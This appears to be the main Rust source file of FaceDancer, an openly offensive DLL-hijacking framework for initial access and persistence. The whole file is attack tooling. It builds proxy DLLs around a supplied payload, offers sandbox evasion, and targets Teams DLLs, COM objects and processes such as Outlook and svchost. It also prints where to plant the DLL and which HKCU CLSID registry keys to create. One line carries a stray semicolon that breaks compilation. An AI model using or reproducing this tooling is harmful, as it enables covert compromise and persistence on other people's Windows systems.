#![allow(warnings)]
use build::setupcargo;
use exports::{GenerateExports, ListExports};
use clap::{Arg, Command};
use digest::Digest;
use sha2::Sha256;
use std::env;
use std::fs;
use std::fs::File;
use std::io::Write;
use std::io::{BufReader, Read};
use std::process::Command as OtherCommand;
use rand::{Rng, distributions::Alphanumeric, SeedableRng};
use rand_chacha::ChaCha20Rng;

fn main() {
    println!(r"
    ___________                   ________                                    
    \_   _____/____    ____  ____ \______ \ _____    ____   ____  ___________ 
     |    __) \__  \ _/ ___\/ __ \ |    |  \\__  \  /    \_/ ___\/ __ \_  __ \
     |     \   / __ \\  \__\  ___/ |    `   \/ __ \|   |  \  \__\  ___/|  | \/
     \___  /  (____  /\___  >___  >_______  (____  /___|  /\___  >___  >__|   
         \/        \/     \/    \/        \/     \/     \/     \/    \/                                              
                                    (@Tyl0us)
                ");
                let matches = Command::new("FaceDancer")
                .version("1.0")
                .author("Matt Eidelberg - Tyl0us")
                .about("A DLL Hijacking framework for initial access and persistence")
                .subcommand(
                Command::new("recon")
                    .about("Reconnaissance tools")
                    .arg(Arg::new("recon_input")
                        .short('I')
                        .long("Input")
                        .value_name("INPUT")
                        .help("Path to the DLL to examine.")
                        .value_parser(clap::value_parser!(String)))
                    .arg(Arg::new("recon_exports")
                        .short('E')
                        .long("exports")
                        .help("Displays the exported functions for the targeted DLL (only will show the first 20)")
                        .action(clap::ArgAction::SetTrue))
                    .arg(Arg::new("recon_generate")
                        .short('G')
                        .long("generate")
                        .help("Generates the necessary .def for proxying")
                        .action(clap::ArgAction::SetTrue))
                )
                .subcommand(
                    Command::new("attack")
                        .about("Attack tools")
                        .arg(Arg::new("attack_output")
                            .short('O')
                            .long("Output")
                            .value_name("OUTPUT")
                            .help("Name of output DLL file.")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_input")
                            .short('I')
                            .long("Input")
                            .value_name("INPUT")
                            .help("Path to the 64-bit DLL.")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_dll")
                            .short('D')
                            .long("DLL")
                            .value_name("DLL")
                            .help("The DLL to proxy: 
                    [1] OneAuth.dll
                    [2] ffmpeg.dll (warning can be unstable)
                    [3] skypert.dll
                    [4] SlimCV.dll")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_com")
                            .short('C')
                            .long("COM")
                            .value_name("COM")
                            .help("The COM-DLL to proxy: 
                    [1] ExplorerFrame.dll
                    [2] fastprox.dll
                    [3] mssprxy.dll
                    [4] netprofm.dll
                    [5] npmproxy.dll
                    [6] OneCoreCommonProxyStub.dll
                    [7] propsys.dll                                    
                    [8] stobject.dll
                    [9] wbemprox.dll
                    [10] webplatstorageserver.dll
                    [11] Windows.StateRepositoryPS.dll              
                    [12] windows.storage.dll
                    [13] wpnapps.dll")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_process_load")
                            .short('P')
                            .long("PROCESS")
                            .value_name("PROCESS")
                            .help("Process to proxy load into: 
                    [1] Outlook
                    [2] Excel
                    [3] svchost
                    [4] Explorer
                    [5] sihost
                    [6] msedge
                    [7] OneDriveStandaloneUpdater                             
                    [8] SSearchProtocolHost
                    [9] Olk
                    [10] Teams
                    [11] Werfault            
                    [12] Sdxhelper
                    [13] AppHostRegistrationVerifier
                    [14] rdpclip
                    [15] Microsoft.SharePoint
                    [16] MusNotificationUx
                    [17] PhoneExperienceHost
                    [18] taskhostw
                    [19] DllHost      
                                    ")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_sandbox")
                            .short('s')
                            .long("sandbox")
                            .help("Enables sandbox evasion by checking:
                    - Is Endpoint joined to a domain?
                    - Is the file's name the same as its SHA256 value?")
                            .action(clap::ArgAction::SetTrue))
                            .arg(Arg::new("attack_def")
                            .short('F')
                            .long("def")
                            .value_name("")
                            .help("Path to the .def file used for export generation.")
                            .value_parser(clap::value_parser!(String))
                            .required(false))
                )
                .get_matches();
        
            match matches.subcommand() {
                Some(("recon", sub_m)) => {
                    let mut _input: Option<&String> = None;
                    let has_args = sub_m.get_one::<String>("recon_input").is_some()
                        || sub_m.get_flag("recon_exports")
                        || sub_m.get_flag("recon_generate");
        
                    if has_args {
                        if let Some(input) = sub_m.get_one::<String>("recon_input") {
                            if !input.ends_with(".dll") {
                                eprintln!("[!] Error: Can't parse a non DLL file. Please try again with a valid DLL");
                                std::process::exit(1);
                            }
                            _input = Some(input);
                        }
                        if sub_m.get_flag("recon_exports") {
                            if let Some(input) = _input {
                                ListExports(input);
                            } else {
                                eprintln!("[!] Error: Input file is required for generating exports.");
                                std::process::exit(1);
                            }
                        }
                        if sub_m.get_flag("recon_generate") {
                            if let Some(input) = _input {
                                GenerateExports(input);
                            } else {
                                eprintln!("[!] Error: Input file is required for generating exports.");
                                std::process::exit(1);
                            }
                        }
                    } else {
                        println!("[!] Missing arguments. Use -h for more options.");
                    }
                }
                Some(("attack", sub_m)) => {
                    let has_args = sub_m.get_one::<String>("attack_output").is_some()
                        || sub_m.get_one::<String>("attack_input").is_some()
                        || sub_m.get_one::<String>("attack_dll").is_some()
                        || sub_m.get_one::<String>("attack_com").is_some()
                        || sub_m.get_one::<String>("attack_process_load").is_some()
                        || sub_m.get_flag("attack_sandbox");
                        || sub_m.get_flag("attack_def");
        
                    if has_args {
                        let attack_input = sub_m.get_one::<String>("attack_input").expect("Input is required");        
                        let compiled_file_name = sub_m.get_one::<String>("attack_output").expect("Output is required");        
                        let mut extension = "";
                        let mut fullfile = "";
                        let mut file = "";
                        let mut proxydll = "";
                        let mut custom_def_file = "";
        
                        if let Some(proxydll_value) = sub_m.get_one::<String>("attack_dll") {
                            let valid_proxydll = vec!["OneAuth.dll", "ffmpeg.dll", "skypert.dll", "SlimCV.dll"];
                            if !valid_proxydll.contains(&proxydll_value.as_str()) {            
                                eprintln!("[!] Error: Invalid proxydll option must be either 1, 2, 3 or 4.");
                                std::process::exit(1);
                            }
                            fullfile = proxydll_value;
                            println!("[+] Execution mode: 'DLL Proxy' selected");
                            println!("[*] {} selected for creation", proxydll_value);
                        }
                        if let Some(comdll_value) = sub_m.get_one::<String>("attack_com") {
                            let valid_comdll = vec!["ExplorerFrame", "fastprox", "mssprxy", "netprofm", "npmproxy", "OneCoreCommonProxyStub", "propsys", "stobject", "wbemprox", "webplatstorageserver", "Windows.StateRepositoryPS", "windows.storage", "wpnapps"];
                            if !valid_comdll.contains(&comdll_value.as_str()) {            
                                eprintln!("[!] Error: Invalid proxydll option must be either 1, 2, 3 or 4.");
                                std::process::exit(1);
                            }
                            fullfile = comdll_value;
                            println!("[+] Execution mode: 'COM Proxy' selected");
                            println!("[*] {} selected for creation", comdll_value);
                        }
                        if let Some(processname_value) = sub_m.get_one::<String>("attack_process_load") {
                            let valid_processes = vec!["Outlook", "Excel", "svchost", "Explorer", "sihost", "msedge", "OneDriveStandaloneUpdater", "SSearchProtocolHost", "Olk", "Teams", "Werfault", "Sdxhelper", "AppHostRegistrationVerifier", "rdpclip", "Microsoft.SharePoint", "MusNotificationUx", "PhoneExperienceHost", "taskhostw", "DllHost"];
                            if !valid_processes.contains(&processname_value.as_str()) {            
                                eprintln!("[!] Error: Invalid process name option.");
                                std::process::exit(1);
                            }
                            fullfile = processname_value;
                            println!("[+] Execution mode: 'Targeted Process' proxying selected");
                            println!("[*] {} selected for creation", processname_value);
                        }
                        file = fullfile;
                        if let Some(def_file) = sub_m.get_one::<String>("attack_def") {
                            if !def_file.ends_with(".def") {
                                eprintln!("[!] Error: Invalid file type. Please provide a valid .def file.");
                                std::process::exit(1);
                            }
                            println!("[*] Using .def file: {}", def_file);
                            custom_def_file = def_file;
                        }
                        if let Some(output) = sub_m.get_one::<String>("attack_output").or_else(|| sub_m.get_one::<String>("attack_process_load")) {
                            if file.starts_with("test.") {
                                eprintln!("[!] Error: Cannot name project test, it conflicts with Rust's built-in test library.");
                                std::process::exit(1);
                            }
                            if file.ends_with(".dll") {
                                file = file.split(".dll").next().unwrap();
                                extension = "dll";
                            }
                        } else {
                        }
                        let mut buildtype = "";
                        if sub_m.get_one::<String>("attack_dll").is_some() {
                            buildtype = "DLL";
                        } else if sub_m.get_one::<String>("attack_com").is_some() {
                            buildtype = "COM";
                        }
                        if sub_m.get_one::<String>("attack_process_load").is_some() {
                            buildtype = "Process";
                        }
                        if custom_def_file != "" {
                            buildtype = "Custom";
                            file = "Custom";
                        }
                        let sandbox = sub_m.get_flag("attack_sandbox");
                        let (new_word, com_string) = setupcargo(sub_m.get_one::<String>("attack_input").unwrap(), file, extension, buildtype, sandbox, custom_def_file);
                        buildfile(file, sandbox, buildtype);
                        cleanup(file, compiled_file_name, extension, new_word, &com_string, buildtype);
                    } else {
                        println!("[!] Missing arguments. Use -h for more options.");
                    }
                }
                _ => {
                    eprintln!("[!] No valid command was used. Use --help for more information.");
                }
            }
        }

fn buildfile(project_name: &str, sandbox: bool, buildtype: &str) {
    let original_path = env::current_dir().unwrap();
    let project_path = original_path.join(project_name);
    env::set_current_dir(&project_path).expect("Failed to change directory to Rust project");
    let mut args;
    if cfg!(target_os = "windows") {
        args = vec!["build", "--release"];
    } else {
        args = vec!["build", "--release", "--target", "x86_64-pc-windows-gnu"];
    };
    args.push("--quiet");
    
    // Initialize a mutable string for The command rustup target add storing features
    let mut features = String::new();
    if sandbox{
        features.push(' ');
        features.push_str("sandbox");
    }
    if buildtype == "Process" {
        features.push(' ');
        features.push_str("process_mode");
    }
    // Check if there are any features to add
    if !features.is_empty() {
        args.push("--features");
        args.push(&features);
    }
    println!("[*] Compiling Payload... please be patient");
    let status = OtherCommand::new("cargo")
        .args(&args)
        .status()
        .expect("Failed to execute 'cargo build'");

    if !status.success() {
        eprintln!("Error: 'cargo build' failed. Please ensure you have the following:");
        eprintln!("- The Target 'x86_64-pc-windows-gnu'");
        std::process::exit(1);
    }
    env::set_current_dir(&original_path).expect("Failed to change directory back to original path");
}

pub fn cleanup(project_name: &str, file_name: &str, extension: &str, new_word: String, com_string: &str, buildtype: &str) {
    let original_path = env::current_dir().unwrap();
    let project_path = original_path.join(project_name);
    let compiled_file_pathway = if cfg!(target_os = "windows") {
        project_path
            .join("target")
            .join("release")
    } else {
        project_path
            .join("target")
            .join("x86_64-pc-windows-gnu")
            .join("release")
    };

    let compiled_file = compiled_file_pathway.join(format!("{}.dll", project_name));
    if !compiled_file.exists() {
        eprintln!("[!] Error: Compiled file not found");
        std::process::exit(1);
    }

    let target_file = original_path.join(format!("{}", file_name));
    fs::copy(compiled_file, &target_file).expect("[!] Failed to copy compiled file");
    fs::remove_dir_all(project_path).expect("Failed to remove Rust project folder");

    if buildtype == "DLL"{
        println!("[!] Important: Drop the file into the following directory AFTER renaming the original dll to '{}.dll':", new_word);
        if project_name == "OneAuth" {
            println!("C:\\Users\\{{username}}\\AppData\\Local\\Microsoft\\TeamsMeetingAddin\\{{version}}\\x64\\OneAuth.dll");
            println!("Warning in some versions of TeamsMeetingAddin the actual folder name is TeamsMeetingAdd-in (Microsoft being Microsoft)");
        } else if project_name == "ffmpeg" {
            println!("C:\\Users\\{{username}}\\AppData\\Local\\Microsoft\\Teams\\current\\ffmpeg.dll");
            println!("[*] Friendly reminder that this DLL maybe unstable depending on version of Teams");
        } else if project_name == "skypert" {
            println!("C:\\Users\\{{username}}\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar.unpacked\\node_modules\\slimcore\\bin\\skypert.dll");
        } else if project_name == "SlimCV" {
            println!("C:\\Users\\{{username}}\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar.unpacked\\node_modules\\slimcore\\bin\\SlimCV.dll");
        }
    } else if buildtype == "Custom" {
        println!("[!] Important: This is a custom DLL that FaceDancer doesn't have a pre-compiled registry key for.");
        println!("[!] Make sure you create the appropriate registry keys");
    } else { 
        println!("[!] Important: Create the following registry keys:");
        println!("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{}", com_string);
        println!("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{}\\InprocServer32", com_string);
        println!("[!] Make sure the InprocServer32's default key contains the path to the DLL");
    }

    let mut file = File::open(target_file).expect("[!] Failed to open file");
    let mut buf_reader = BufReader::new(file);
    let mut hasher = Sha256::new();
    let mut buffer = [0; 1024];
    loop {
        let bytes_read = buf_reader.read(&mut buffer).expect("[!] Failed to read file");
        if bytes_read == 0 {
            break;
        }
        hasher.update(&buffer[..bytes_read]);
    }
    let result = hasher.finalize();
    println!("[*] SHA-256 hash: {:x}", result);
}
